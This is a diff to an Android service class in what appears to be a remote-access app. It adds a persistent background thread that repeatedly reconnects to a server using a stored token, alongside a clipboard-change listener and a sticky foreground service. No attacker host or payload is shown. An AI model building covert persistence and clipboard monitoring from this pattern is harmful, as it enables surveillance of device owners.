@@ -1,6 +1,5 @@
 package com.remote.app;
 
-import android.Manifest;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -10,23 +9,23 @@ import android.content.ClipboardManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
-import android.os.AsyncTask;
 import android.os.Build;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
 import android.support.annotation.RequiresApi;
-import android.support.v4.app.ActivityCompat;
 import android.support.v4.app.NotificationCompat;
+import android.widget.Toast;
 
 import com.remote.app.socket.IOSocket;
 
-import org.json.JSONException;
-import org.json.JSONObject;
 
 public class MainService extends Service {
     private static Context contextOfApplication;
+
+    private static ConnectionManager connectionManager;
 
     @Override
     public void onCreate() {
@@ -39,6 +38,9 @@ public class MainService extends Service {
             startMyOwnForeground();
         else
             startForeground(1, new Notification());
+
+        initHealthCheck();
+
     }
 
     @RequiresApi(Build.VERSION_CODES.O)
@@ -87,25 +89,44 @@ public class MainService extends Service {
         clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);
 
         contextOfApplication = this;
+
         initHealthCheck();
         return START_STICKY;
     }
 
+    private Thread healthThread;
+
     private void initHealthCheck() {
-        new Thread(() -> {
-        while (true) {
-            try {
-                Thread.sleep(30000);
-                ConnectionManager.startAsync(this);
-                Thread.sleep(60000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
+        if (connectionManager == null)
+            connectionManager = new ConnectionManager(this);
+
+        if (healthThread != null && healthThread.isAlive() && !healthThread.isInterrupted())
+            return;
+
+
+        healthThread = new Thread(() -> {
+            while (true) {
+                SharedPreferences settings = getApplicationContext().getSharedPreferences("CONN_SETTINGS", 0);
+
+                try {
+                    Thread.sleep(15000);
+
+                    if (!settings.contains("user-token")) {
+                        continue;
+                    }
+
+                    connectionManager.startAsync(settings.getString("user-token", null));
+
+                    Thread.sleep(60000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
             }
-        }
-        }).start();
+        });
 
-
+        healthThread.start();
     }
+
     @Override
     public void onDestroy() {
         super.onDestroy();
